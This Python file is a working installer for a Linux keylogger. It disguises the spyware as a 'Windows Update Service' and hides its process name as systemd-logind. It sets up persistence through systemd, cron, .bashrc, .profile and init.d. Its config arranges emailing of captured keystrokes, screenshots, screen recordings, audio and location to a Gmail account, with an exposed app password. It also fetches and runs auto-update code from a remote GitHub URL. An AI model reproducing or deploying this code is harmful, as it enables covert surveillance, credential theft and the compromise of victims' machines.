#!/usr/bin/env python3
"""
Linux Keylogger Installer
Installs the keylogger with full stealth and persistence
"""

import os
import sys
import subprocess
import shutil
import stat
import pwd
import grp
import time

# Configuration
INSTALL_DIR = "/opt/WindowsUpdateService"
SCRIPT_NAME = "windowsupdateservice.py"
CONFIG_DIR = "/etc/windowsupdateservice"
LOG_DIR = "/var/log/windowsupdateservice"
DATA_DIR = "/var/lib/windowsupdateservice"

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        print("[ERROR] This installer must be run as root (sudo)")
        sys.exit(1)

def install_dependencies():
    """Install required Python packages"""
    print("[INFO] Installing dependencies...")
    
    deps = [
        'pynput',
        'evdev',
        'mss',
        'Pillow',
        'opencv-python',
        'numpy',
        'sounddevice',
        'soundfile',
        'requests',
        'pyperclip',
        'psutil',
        'python-xlib',
        'pyaudio'
    ]
    
    for dep in deps:
        try:
            subprocess.run(['pip3', 'install', dep], check=True, capture_output=True)
            print(f"[OK] Installed: {dep}")
        except subprocess.CalledProcessError:
            print(f"[WARNING] Failed to install: {dep}")

def create_directories():
    """Create necessary directories"""
    print("[INFO] Creating directories...")
    
    for dir_path in [INSTALL_DIR, CONFIG_DIR, LOG_DIR, DATA_DIR]:
        os.makedirs(dir_path, exist_ok=True)
        os.chmod(dir_path, 0o755)

def install_service():
    """Install systemd service"""
    print("[INFO] Installing systemd service...")
    
    service_content = """[Unit]
Description=Windows Update Service
After=network.target sound.target graphical.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=windowsupdateservice
Nice=19
IOSchedulingClass=idle
ProtectSystem=false
ProtectHome=false
NoNewPrivileges=false

[Install]
WantedBy=multi-user.target
"""
    
    service_path = "/etc/systemd/system/windowsupdateservice.service"
    with open(service_path, 'w') as f:
        f.write(service_content)
    
    os.chmod(service_path, 0o644)
    
    # Reload systemd
    subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
    subprocess.run(['systemctl', 'enable', 'windowsupdateservice.service'], capture_output=True)
    subprocess.run(['systemctl', 'start', 'windowsupdateservice.service'], capture_output=True)
    
    print("[OK] Service installed and started")

def install_cron():
    """Add to crontab for persistence"""
    print("[INFO] Adding to crontab...")
    
    cron_cmd = f"@reboot /usr/bin/python3 {INSTALL_DIR}/{SCRIPT_NAME} --hidden > /dev/null 2>&1"
    
    try:
        # Get existing crontab
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        current_cron = result.stdout if result.returncode == 0 else ""
        
        # Add if not already present
        if cron_cmd not in current_cron:
            new_cron = current_cron + cron_cmd + "\n"
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(new_cron)
            print("[OK] Added to crontab")
        else:
            print("[INFO] Already in crontab")
    except Exception as e:
        print(f"[WARNING] Could not add to crontab: {e}")

def install_bashrc():
    """Add to .bashrc for user persistence"""
    print("[INFO] Adding to .bashrc...")
    
    try:
        home = os.path.expanduser("~")
        bashrc = os.path.join(home, ".bashrc")
        
        if os.path.exists(bashrc):
            with open(bashrc, 'r') as f:
                content = f.read()
            
            if f"{SCRIPT_NAME}" not in content:
                with open(bashrc, 'a') as f:
                    f.write(f'\n# Windows Update Service\n[ -x {INSTALL_DIR}/{SCRIPT_NAME} ] && nohup /usr/bin/python3 {INSTALL_DIR}/{SCRIPT_NAME} --hidden > /dev/null 2>&1 &\n')
                print("[OK] Added to .bashrc")
            else:
                print("[INFO] Already in .bashrc")
    except Exception as e:
        print(f"[WARNING] Could not add to .bashrc: {e}")

def install_profile():
    """Add to .profile for user persistence"""
    print("[INFO] Adding to .profile...")
    
    try:
        home = os.path.expanduser("~")
        profile = os.path.join(home, ".profile")
        
        if os.path.exists(profile):
            with open(profile, 'r') as f:
                content = f.read()
            
            if f"{SCRIPT_NAME}" not in content:
                with open(profile, 'a') as f:
                    f.write(f'\n# Windows Update Service\n[ -x {INSTALL_DIR}/{SCRIPT_NAME} ] && nohup /usr/bin/python3 {INSTALL_DIR}/{SCRIPT_NAME} --hidden > /dev/null 2>&1 &\n')
                print("[OK] Added to .profile")
            else:
                print("[INFO] Already in .profile")
    except Exception as e:
        print(f"[WARNING] Could not add to .profile: {e}")

def install_initd():
    """Add to /etc/init.d/ for system startup"""
    print("[INFO] Adding to /etc/init.d/...")
    
    init_script = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides:          windowsupdateservice
# Required-Start:    $remote_fs $network
# Required-Stop:     $remote_fs $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Windows Update Service
# Description:       Windows Update Service
### END INIT INFO

case "$1" in
    start)
        echo "Starting Windows Update Service..."
        /usr/bin/python3 {INSTALL_DIR}/{SCRIPT_NAME} --hidden &
        ;;
    stop)
        echo "Stopping Windows Update Service..."
        pkill -f "{SCRIPT_NAME}"
        ;;
    status)
        if pgrep -f "{SCRIPT_NAME}" > /dev/null; then
            echo "Windows Update Service is running"
        else
            echo "Windows Update Service is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {{start|stop|status}}"
        exit 1
        ;;
esac

exit 0
"""
    
    init_path = "/etc/init.d/windowsupdateservice"
    with open(init_path, 'w') as f:
        f.write(init_script)
    
    os.chmod(init_path, 0o755)
    
    # Update rc.d
    subprocess.run(['update-rc.d', 'windowsupdateservice', 'defaults'], capture_output=True)
    
    print("[OK] Added to /etc/init.d/")

def copy_script():
    """Copy the main script"""
    print("[INFO] Copying main script...")
    
    script_path = os.path.join(INSTALL_DIR, SCRIPT_NAME)
    shutil.copy2(sys.argv[0], script_path)
    os.chmod(script_path, 0o755)
    
    print(f"[OK] Script installed to {script_path}")

def install_config():
    """Install configuration file"""
    print("[INFO] Creating configuration...")
    
    config_path = os.path.join(CONFIG_DIR, 'config.ini')
    
    config_content = """[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/windowsupdateservice.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
ChecksumURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/checksum.txt
MaxDownloadSizeMB = 100
RetryAttempts = 5
"""
    
    with open(config_path, 'w') as f:
        f.write(config_content)
    
    os.chmod(config_path, 0o600)
    print(f"[OK] Config created at {config_path}")

def start_service():
    """Start the service"""
    print("[INFO] Starting service...")
    subprocess.run(['systemctl', 'start', 'windowsupdateservice.service'], capture_output=True)
    print("[OK] Service started")

def setup_persistent():
    """Setup all persistence mechanisms"""
    install_service()
    install_cron()
    install_bashrc()
    install_profile()
    install_initd()

def main():
    """Main installer"""
    print("=" * 70)
    print(" LINUX KEYLOGGER INSTALLER")
    print("=" * 70)
    
    check_root()
    
    print("\n[INFO] Starting installation...")
    
    install_dependencies()
    create_directories()
    copy_script()
    install_config()
    setup_persistent()
    start_service()
    
    print("\n" + "=" * 70)
    print(" INSTALLATION COMPLETE!")
    print("=" * 70)
    print(f" Installed: {INSTALL_DIR}")
    print(f" Config: {CONFIG_DIR}")
    print(f" Logs: {LOG_DIR}")
    print(f" Data: {DATA_DIR}")
    print("\n Services:")
    print("   systemd: windowsupdateservice.service")
    print("   init.d: /etc/init.d/windowsupdateservice")
    print("   crontab: @reboot")
    print("   bashrc: ~/.bashrc")
    print("   profile: ~/.profile")
    print("=" * 70)

if __name__ == "__main__":
    main()
